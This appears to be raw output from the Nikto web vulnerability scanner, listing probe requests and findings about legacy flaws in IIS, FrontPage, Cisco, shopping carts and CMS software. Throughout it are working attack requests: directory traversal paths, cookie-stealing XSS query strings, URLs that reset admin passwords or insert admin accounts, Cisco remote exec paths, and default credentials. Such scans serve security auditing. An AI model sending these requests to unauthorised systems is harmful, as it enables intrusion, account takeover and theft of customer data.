++ GET /scripts/Carello/Carello.dll: Carello 1.3 may allow commands to be executed on the server by replacing hidden form elements. This could not be tested by Nikto. See: CVE-2001-0614: 
++ GET /scripts/tools/dsnform.exe: Allows creation of ODBC Data Source.
++ GET /SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp: Microsoft Site Server script used to create, modify, and potentially delete LDAP users and groups. See: https://securitytracker.com/id/1003420: 
++ GET /SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp: Microsoft Site Server used to create, modify, and potentially delete LDAP users and groups. See: https://securitytracker.com/id/1003420: 
++ GET /prd.i/pgen/: Has MS Merchant Server 1.0.
++ GET /readme.eml: Remote server may be infected with the Nimda virus.
++ GET /scripts/httpodbc.dll: Possible IIS backdoor found.
++ GET /scripts/proxy/w3proxy.dll: MSProxy v1.0 installed.
++ GET /SiteServer/admin/: Site Server components admin. Default account may be 'LDAP_Anonymous', pass is 'LdapPassword_1'. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt: 
++ GET /siteseed/: Siteseed pre 1.4.2 have 'major' security problems.
++ GET /iisadmin/: Access to /iisadmin should be restricted to localhost or allowed hosts only.
++ GET /PDG_Cart/order.log: PDG Commerce log found. See: http://zodi.com/cgi-bin/shopper.cgi?display=intro&template=Intro/commerce.html: 
++ GET /view_source.jsp: Resin 2.1.2 view_source.jsp allows any file on the system to be viewed by using \..\ directory traversal. This script may be vulnerable.
++ GET /w-agora/: w-agora pre 4.1.4 may allow a remote user to execute arbitrary PHP scripts via URL includes in include/*.php and user/*.php files. Default account is 'admin' but password set during install.
++ GET /vider.php3: MySimpleNews may allow deleting of news items without authentication. See: CVE-2002-2320: 
++ GET /officescan/cgi/cgiChkMasterPwd.exe: Trend Micro Officescan allows you to skip the login page and access some CGI programs directly. See: https://web.archive.org/web/20030607054822/http://support.microsoft.com/support/exchange/content/whitepapers/owaguide.doc: 
++ GET /pbserver/pbserver.dll: This may contain a buffer overflow. See: MS00-094: 
++ GET /administrator/gallery/uploadimage.php: Mambo PHP Portal/Server 4.0.12 BETA and below may allow upload of any file type simply putting '.jpg' before the real file extension.
++ GET /pafiledb/includes/team/file.php: paFileDB 3.1 and below may allow file upload without authentication.
++ GET /phpEventCalendar/file_upload.php: phpEventCalendar 1.1 and prior are vulnerable to file upload bug.
++ GET /scripts/cpshost.dll: Posting acceptor possibly allows you to upload files.
++ GET /upload.asp: An ASP page that allows attackers to upload files to server.
++ GET /uploadn.asp: An ASP page that allows attackers to upload files to server.
++ GET /uploadx.asp: An ASP page that allows attackers to upload files to server.
++ GET /wa.exe: An ASP page that allows attackers to upload files to server.
++ GET /basilix/compose-attach.php3: BasiliX webmail application prior to 1.1.1 contains a non-descript security vulnerability in compose-attach.php3 related to attachment uploads.
++ GET /server/: Possibly Macromedia JRun or CRX WebDAV upload.
++ GET /vgn/ac/data: Vignette CMS admin/maintenance script available.
++ GET /vgn/ac/edit: Vignette CMS admin/maintenance script available.
++ GET /vgn/ac/esave: Vignette CMS admin/maintenance script available.
++ GET /vgn/ac/fsave: Vignette CMS admin/maintenance script available.
++ GET /vgn/ac/index: Vignette CMS admin/maintenance script available.
++ GET /vgn/asp/status: Vignette CMS admin/maintenance script available.
++ GET /vgn/asp/style: Vignette CMS admin/maintenance script available.
++ GET /vgn/errors: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/errorpage: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/initialize: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/jspstatus: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/jspstatus56: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/metadataupdate: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/previewer: Vignette CMS admin/maintenance script available.
++ GET /vgn/login: Vignette server may allow user enumeration based on the login attempts to this file.
++ GET /forum/admin/wwforum.mdb: Web Wiz Forums password database found. See: https://seclists.org/bugtraq/2003/Apr/238: 
++ GET /fpdb/shop.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /guestbook/admin/o12guest.mdb: Ocean12 ASP Guestbook Manager allows download of SQL database which contains admin password. See: https://www.exploit-db.com/exploits/22484: 
++ GET /midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server. See: CVE-2002-1432: 
++ GET /MIDICART/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server. See: CVE-2002-1432: 
++ GET /mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb: MPCSoftWeb Guest Book passwords retrieved. See: https://www.exploit-db.com/exploits/22513: 
++ GET /news/news.mdb: Web Wiz Site News release v3.06 admin password database is available and unencrypted.
++ GET /shopping300.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available. See: https://securitytracker.com/id/1004382: 
++ GET /shopping400.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available. See: https://securitytracker.com/id/1004382: 
++ GET /shoppingdirectory/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server. See: CVE-2002-1432: 
++ GET /database/db2000.mdb: Max Web Portal database is available remotely. It should be moved from the default location to a directory outside the web root. See: https://www.medae.co/en/max/web-app: 
++ GET /admin/config.php: PHP Config file may contain database IDs and passwords.
++ GET /adm/config.php: PHP Config file may contain database IDs and passwords.
++ GET /administrator/config.php: PHP Config file may contain database IDs and passwords.
++ GET /contents.php?new_language=elvish&mode=select: Requesting a file with an invalid language selection from DC Portal may reveal the system path.
++ GET /pw/storemgr.pw: Encrypted ID/Pass for Mercantec's SoftCart. See: CVE-1999-0609: 
++ GET /servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter: Allaire ColdFusion allows JSP source viewed through a vulnerable SSI call.
++ GET /shopa_sessionlist.asp: VP-ASP shopping cart test application is available from the web. This page may give the location of .mdb files which may also be available.
++ GET /simplebbs/users/users.php: Simple BBS 1.0.6 allows user information and passwords to be viewed remotely. See: https://www.webhostingtalk.nl/bugtraq-mailing-lijst/23898-simplebbs-1-0-6-default-permissions-vuln.html: 
++ GET /typo3conf/: This may contain sensitive TYPO3 files.
++ GET /cms/typo3conf/: This may contain sensitive TYPO3 files.
++ GET /site/typo3conf/: This may contain sensitive TYPO3 files.
++ GET /typo/typo3conf/: This may contain sensitive TYPO3 files.
++ GET /typo3/typo3conf/: This may contain sensitive TYPO3 files.
++ GET /typo3conf/database.sql: TYPO3 SQL file found.
++ GET /cms/typo3conf/database.sql: TYPO3 SQL file found.
++ GET /site/typo3conf/database.sql: TYPO3 SQL file found.
++ GET /typo/typo3conf/database.sql: TYPO3 SQL file found.
++ GET /typo3/typo3conf/database.sql: TYPO3 SQL file found.
++ GET /typo3conf/localconf.php: TYPO3 config file found.
++ GET /cms/typo3conf/localconf.php: TYPO3 config file found.
++ GET /site/typo3conf/localconf.php: TYPO3 config file found.
++ GET /typo/typo3conf/localconf.php: TYPO3 config file found.
++ GET /typo3/typo3conf/localconf.php: TYPO3 config file found.
++ GET /webcart-lite/config/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /webcart-lite/orders/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /webcart/carts/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /webcart/config/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /webcart/orders/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /webcart/orders/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /_mem_bin/auoconfig.asp: Displays the default AUO (LDAP) schema, including host and port.
++ GET /SiteServer/Admin/knowledge/persmbr/vs.asp: Expose various LDAP service and backend configuration parameters. See: https://vulners.com/osvdb/OSVDB:17659: 
++ GET /SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp: Expose various LDAP service and backend configuration parameters. See: https://vulners.com/osvdb/OSVDB:17661: 
++ GET /SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp: Expose various LDAP service and backend configuration parameters. See: https://vulners.com/osvdb/OSVDB:17662: 
++ GET /SiteServer/Admin/knowledge/persmbr/VsTmPr.asp: Expose various LDAP service and backend configuration parameters. See: https://vulners.com/osvdb/OSVDB:17660: 
++ GET /tvcs/getservers.exe?action=selects1: Following steps 2-4 of this page may reveal a zip file that contains passwords and system details.
++ GET /whatever.htr: May reveal physical path. htr files may also be vulnerable to an off-by-one overflow that allows remote command execution. See: MS02-018: 
++ GET /nsn/fdir.bas:ShowVolume: You can use ShowVolume and ShowDirectory directly on the Novell server (NW5.1) to view the filesystem without having to log in.
++ GET /forum/admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein.
++ GET /webmail/blank.html: IlohaMail 0.8.10 contains an XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
++ GET /jamdb/: JamDB pre 0.9.2 mp3.php and image.php can allow user to read arbitrary file out of docroot.
++ GET /cgi/cgiproc?: It may be possible to crash Nortel Contivity VxWorks by requesting '/cgi/cgiproc?$' (not attempted!). Upgrade to version 2.60 or later. See: CVE-2000-0063: 
++ GET /servlet/sunexamples.BBoardServlet: This default servlet lets attackers execute arbitrary commands.
++ GET /servlets/SchedulerTransfer: PeopleSoft SchedulerTransfer servlet found, which may allow remote command execution. See: CVE-2003-0104: 
++ GET /perl/-e%20print%20Hello: The Perl interpreter on the Novell system may allow any command to be executed. See: BID-5520: 
++ GET /quikstore.cgi: A shopping cart.
++ GET /securecontrolpanel/: Web Server Control Panel.
++ GET /webmail/: Web based mail package installed.
++ GET /_cti_pvt/: FrontPage directory found.
++ GET /smg_Smxcfg30.exe?vcc=3560121183d3: This may be a Trend Micro Officescan 'backdoor'.
++ GET /nsn/..%5Cutil/attrib.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/del.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/dsbrowse.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/lancard.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/md.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/rd.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/ren.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/send.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cutil/slist.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cweb/env.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /nsn/..%5Cwebdemo/fdir.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server.
++ GET /upd/: WASD Server can allow directory listings by requesting /upd/directory/. Upgrade to a later version and secure according to the documents on the WASD web site.
++ GET /CVS/Entries: CVS Entries file may contain directory listing information.
++ GET /3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: https://seclists.org/fulldisclosure/2003/Jun/536: 
++ GET /phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: https://seclists.org/fulldisclosure/2003/Jun/536: 
++ GET /3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: https://seclists.org/fulldisclosure/2003/Jun/536: 
++ GET /phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: https://seclists.org/fulldisclosure/2003/Jun/536: 
++ GET /pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: https://seclists.org/fulldisclosure/2003/Jun/536: 
++ GET /.tools/phpMyAdmin/current/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: https://seclists.org/fulldisclosure/2003/Jun/536: 
++ GET /LOGIN.PWD: MIPCD password file with unencrypted passwords. MIPDCD should not have the web interface enabled.
++ GET /USER/CONFIG.AP: MIPCD configuration information. MIPCD should not have the web interface enabled.
++ GET /cgi-bin/cgi_process: WASD reveals a lot of system information in this script. It should be removed.
++ GET /ht_root/wwwroot/-/local/httpd$map.conf: WASD reveals the http configuration file. Upgrade to a later version and secure according to the documents on the WASD web site.
++ GET /tree: WASD Server reveals the entire web root structure and files via this URL. Upgrade to a later version and secure according to the documents on the WASD web site.
++ GET /Config1.htm: This may be a D-Link. Some devices have a DoS condition if an oversized POST request is sent. This DoS was not tested. See: https://raw.githubusercontent.com/sullo/advisory-archives/master/phenoelit.de_dp-300.txt: 
++ GET /WebAdmin.dll?View=Logon: Some versions of WebAdmin are vulnerable to a remote DoS (not tested). See: CVE-2005-1247: 
++ GET /cgi-win/cgitest.exe: This CGI may allow the server to be crashed remotely. See: CVE-2002-0128: 
++ GET /cgi-shl/win-c-sample.exe: win-c-sample.exe has a buffer overflow.
++ GET /................../config.sys: PWS allows files to be read by prepending multiple '.' characters. At worst, IIS, not PWS, should be used.
++ GET /..\..\..\..\..\..\temp\temp.class: Cisco ACS 2.6.x and 3.0.1 (build 40) allows authenticated remote users to retrieve any file from the system. Upgrade to the latest version.
++ GET /admentor/adminadmin.asp: Version 2.11 of AdMentor is vulnerable to SQL injection during login, in the style of: ' or =. See: CVE-2002-0308: 
++ GET /My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: CVE-2006-6795: 
++ GET /postnuke/My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: CVE-2006-6795: 
++ GET /postnuke/html/My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: CVE-2006-6795: 
++ GET /modules/My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: CVE-2006-6795: 
++ GET /phpBB/My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: CVE-2006-6795: 
++ GET /forum/My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: CVE-2006-6795: 
++ GET /author.asp: May be FactoSystem CMS, which could include SQL injection problems that could not be tested remotely. See: CVE-2002-1499: 
++ GET /phpimageview.php?pic=javascript:alert(8754): PHP Image View 1.0 is vulnerable to Cross Site Scripting (XSS). See: CVE-2002-1724: 
++ GET /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS).
++ GET /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS).
++ GET /members.asp?SF=%22;}alert(223344);function%20x()\{v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). See: OSVDB-4598: 
++ GET /jigsaw/: Jigsaw server may be installed. Versions lower than 2.2.1 are vulnerable to Cross Site Scripting (XSS) in the error page. See: CVE-2002-1053: 
++ GET /forum_members.asp?find=%22;}alert(9823);function%20x()\{v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). See: OSVDB-2946: 
++ GET /anthill/login.php: Anthill bug tracking system may be installed. Versions lower than 0.1.6.1 allow XSS and may allow users to bypass login requirements.
++ GET /cfdocs/expeval/sendmail.cfm: Can be used to send email; go to the page and fill in the form.
++ GET /cgi-bin/bigconf.cgi: BigIP Configuration CGI. See: CVE-1999-1550: 
++ GET /ammerum/: Ammerum pre 0.6-1 had several security issues.
++ GET /ariadne/: Ariadne pre 2.1.2 has several vulnerabilities. The default login/pass to the admin page is admin/muze.
++ GET /cbms/cbmsfoot.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ GET /cbms/changepass.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ GET /cbms/editclient.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ GET /cbms/passgen.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ GET /cbms/realinv.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ GET /cbms/usersetup.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ GET /ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C: This check (A) sets up the next BadBlue test (B) for possible exploit. See: CVE-2005-0595: 
++ GET /db/users.dat: upb PB allows the user database to be retrieved remotely. See: OSVDB-59412: 
++ GET /dcshop/auth_data/auth_user_file.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /dcshop/orders/orders.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /Admin_files/order.log: Selena Sol's WebStore 1.0 exposes order information. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /admin/cplogfile.log: DevBB 1.0 final log file is readable remotely. Upgrade to the latest version. See: http://www.mybboard.com: 
++ GET /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
++ GET /cfdocs/snippets/fileexists.cfm: Can be used to verify the existence of files (on the same drive info as the web tree/file).
++ GET /cgi-bin/MachineInfo: Gives out information on the machine (IRIX), including hostname.
++ GET /chat/!nicks.txt: WF-Chat 1.0 Beta allows retrieval of user information. See: OSVDB-59646: 
++ GET /config.php: PHP Config file may contain database IDs and passwords.
++ GET /config/: Configuration information may be available remotely.
++ GET /cplogfile.log: XMB Magic Lantern forum 1.6b final log file is readable remotely. Upgrade to the latest version. See: https://securitytracker.com/id/1004318,http://www.xmbforum.com: 
++ GET /cfdocs/snippets/evaluate.cfm: This allows you to enter Coldfusion code to be evaluated, or potentially create denial of service.
++ GET /cfide/Administrator/startstop.html: Can start/stop the Coldfusion server.
++ GET /cgi-bin/webdist.cgi: Comes with IRIX 5.0 - 6.3; allows to run arbitrary commands. See: CVE-1999-0039: 
++ GET /instantwebmail/message.php: Instant Web Mail is installed. Versions 0.59 and lower can allow remote users to embed POP3 commands in URLs contained in email. See: CVE-2002-0490: 
++ GET /admin.php?en_log_id=0&action=config: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: CVE-2006-5412: 
++ GET /admin.php?en_log_id=0&action=users: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: CVE-2006-5412: 
++ GET /admin.php4?reg_login=1: Mon Album version 0.6.2d allows remote admin access. This should be protected.
++ GET /admin/admin_phpinfo.php4: Mon Album version 0.6.2d allows remote admin access. This should be protected.
++ GET /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: CVE-2002-0995: 
++ GET /dostuff.php?action=modify_user: Blahz-DNS allows unauthorized users to edit user information. Upgrade to version 0.25 or higher. See: CVE-2002-0599,https://sourceforge.net/projects/blahzdns/: 
++ GET /accounts/getuserdesc.asp: Hosting Controller 2002 administration page is available. This should be protected. See: CVE-2002-0776: 
++ GET /agentadmin.php: Immobilier agentadmin.php contains multiple SQL injection vulnerabilities. See: OSVDB-35876: 
++ GET /sqldump.sql: Database SQL?.
++ GET /structure.sql: Database SQL?.
++ GET /servlet/SessionManager: IBM WebSphere reconfigure servlet (user=servlet, password=manager). All default code should be removed from servers.
++ GET /ip.txt: This may be User Online version 2.0, which has a remotely accessible log file.
++ GET /level/42/exec/show%20conf: Retrieved Cisco configuration file.
++ GET /livehelp/: LiveHelp may reveal system information.
++ GET /LiveHelp/: LiveHelp may reveal system information.
++ GET /logs/str_err.log: Bmedia error log, contains invalid login attempts which include the invalid usernames and passwords entered (could just be typos & be very close to the right entries).
++ GET /mall_log_files/order.log: EZMall2000 exposes order information. See: CVE-1999-0606: 
++ GET /order/order_log.dat: Web shopping system exposes order information. See: CVE-1999-0606: 
++ GET /orders/order_log_v12.dat: Web shopping system exposes order information. See: CVE-1999-0606: 
++ GET /pmlite.php: A Xoops CMS script was found. Version RC3 and below allows all users to view all messages (untested). See: https://seclists.org/bugtraq/2002/Dec/129: 
++ GET /session/admnlogin: SessionServlet Output, has session cookie info.
++ GET /SiteScope/htdocs/SiteScope.html: The SiteScope install may allow remote users to get sensitive information about the hosts being monitored. See: OSVDB-613: 
++ GET /servlet/allaire.jrun.ssi.SSIFilter: Allaire ColdFusion allows JSP source viewed through a vulnerable SSI call. See: CVE-2001-0926: 
++ GET /pp.php?action=login: Pieterpost 0.10.6 allows anyone to access the 'virtual' account which can be used to relay/send e-mail. See: OSVDB-2881: 
++ GET /isapi/count.pl?: AN HTTPd default script may allow writing over arbitrary files with a new content of '1', which could allow a trivial DoS. Append /../../../../../ctr.dll to replace this file's contents, for example.
++ GET /krysalis/: Krysalis pre 1.0.3 may allow remote users to read arbitrary files outside docroot.
++ GET /logjam/showhits.php: Logjam may possibly allow remote command execution via showhits.php page.
++ GET /manual.php: Does not filter input before passing to shell command. Try 'ls -l' as the man page entry.
++ GET /smssend.php: PhpSmssend may allow system calls if a ' is passed to it. See: CVE-2002-0220: 
++ GET /ncl_items.html: This may allow attackers to reconfigure your Tektronix printer. See: CVE-1999-1508: 
++ GET /ncl_items.shtml?SUBJECT=1: This may allow attackers to reconfigure your Tektronix printer. See: CVE-2001-0484: 
++ GET /photo/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more.
++ GET /photodata/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more.
++ GET /pub/english.cgi?op=rmail: BSCW self-registration may be enabled. This could allow untrusted users semi-trusted access to the software. 3.x version (and probably some 4.x) allow arbitrary commands to be executed remotely. See: CVE-2002-0095: 
++ GET /pvote/ch_info.php?newpass=password&confirm=password%20: PVote administration page is available. Versions 1.5b and lower do not require authentication to reset the administration password.
++ GET /SetSecurity.shm: Cisco System's My Access for Wireless. This resource should be password protected.
++ GET /thebox/admin.php?act=write&username=admin&password=admin&aduser=admin&adpass=admin: paBox 1.6 may allow remote users to set the admin password. If successful, the 'admin' password is now 'admin'. See: OSVDB-2225: 
++ GET /shopadmin.asp: VP-ASP shopping cart admin may be available via the web. Default ID/PW are vpasp/vpasp and admin/admin.
++ GET /_vti_txt/_vti_cnf/: FrontPage directory found.
++ GET /_vti_txt/: FrontPage directory found.
++ GET /_vti_pvt/deptodoc.btr: FrontPage file found. This may contain useful information.
++ GET /_vti_pvt/doctodep.btr: FrontPage file found. This may contain useful information.
++ GET /_vti_pvt/services.org: FrontPage file found. This may contain useful information.
++ POST /_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=false: We seem to have authoring access to the FrontPage web.
++ POST /_vti_bin/_vti_aut/author.exe?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=false: We seem to have authoring access to the FrontPage web.
++ GET /_vti_bin/_vti_aut/dvwssr.dll: This dll allows anyone with authoring privs to change other users file, and may contain a buffer overflow for unauthenticated users. See: MS00-025: 
++ GET /_vti_bin/_vti_aut/fp30reg.dll: Some versions of the FrontPage fp30reg.dll are vulnerable to a buffer overflow. See: MS03-051: 
++ GET /_vti_pvt/access.cnf: Contains HTTP server-specific access control information. Remove or ACL if FrontPage is not being used. See: CVE-2002-1717: 
++ GET /_vti_pvt/svacl.cnf: File used to store whether subwebs have unique permissions settings and any IP address restrictions. Can be used to discover information about subwebs, remove or ACL if FrontPage is not being used. See: CVE-2002-1717: 
++ GET /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: CVE-1999-0678: 
++ GET /doc: The /doc directory is browsable. This may be /usr/doc. See: CVE-1999-0678: 
++ GET /cgis/wwwboard/wwwboard.cgi: Versions 2.0 Alpha and below have multiple problems. This could allow over-write of messages. Default ID 'WebAdmin' with pass 'WebBoard'. See: BID-1795 CVE-1999-0930: 
++ GET /cgis/wwwboard/wwwboard.pl: Versions 2.0 Alpha and below have multiple problems. This could allow over-write of messages. Default ID 'WebAdmin' with pass 'WebBoard'. See: BID-1795 CVE-1999-0930: 
++ GET /manager/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: CVE-2000-0672: 
++ GET /jk-manager/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: CVE-2000-0672: 
++ GET /jk-status/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: CVE-2000-0672: 
++ GET /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: CVE-2000-0672: 
++ GET /host-manager/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: CVE-2000-0672: 
++ GET /blahb.ida: Reveals physical path. To fix: Preferences -> Home directory -> Application & check 'Check if file exists' for the ISAPI mappings. MS01-033. See: CVE-2001-0500: 
++ GET /BACLIENT: IBM Tivoli default file found. See: OSVDB-2117: 
++ GET /level/16/exec/-///show/configuration: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16/exec/: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16/level/16/exec//show/interfaces: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16/level/16/exec//show/interfaces/status: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16/level/16/exec//show/version: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16/level/16/exec//show/running-config/interface/FastEthernet: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/16/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/17/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/18/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/19/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/20/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/21/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/22/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/25/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/26/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/27/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/28/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/32/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
